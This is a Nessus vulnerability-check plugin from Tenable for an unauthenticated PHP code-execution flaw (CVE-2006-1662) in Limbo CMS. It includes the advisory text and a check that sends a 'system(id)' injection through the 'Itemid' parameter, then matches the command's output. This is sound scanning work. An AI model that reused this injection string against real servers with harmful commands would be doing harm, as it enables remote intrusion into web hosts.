#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an arbitrary code execution vulnerability. 

Description :

The remote host is running Limbo CMS, a content-management system
written in PHP. 

The installed version of Limbo fails to sanitize input to the 'Itemid'
parameter before using it as part of a search string in an 'eval()'
statement in the 'classes/adodbt/read_table.php' script.  Regardless
of PHP's 'register_globals' and 'magic_quotes_gpc' settings, an
unauthenticated attacker can leverage this issue to execute arbitrary
PHP code on the remote host subject to the privileges of the web
server user id. 

See also :

http://www.securityfocus.com/archive/1/426428/30/0/threaded

Solution :

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20994);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-1662");
  script_bugtraq_id(16902);

  script_name(english:"Limbo CMS Itemid Arbitrary Code Execution Vulnerability");
  script_summary(english:"Injects arbitrary PHP code via Itemid parameter in Limbo CMS");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


if (thorough_tests) extra_dirs = make_list ("/limbo");
else extra_dirs = NULL;

http_check_remote_code(
  extra_dirs:extra_dirs,
  check_request:string("/index.php?option=frontpage&Itemid=2|system(id)|", unixtime()),
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc,
  port:port
);
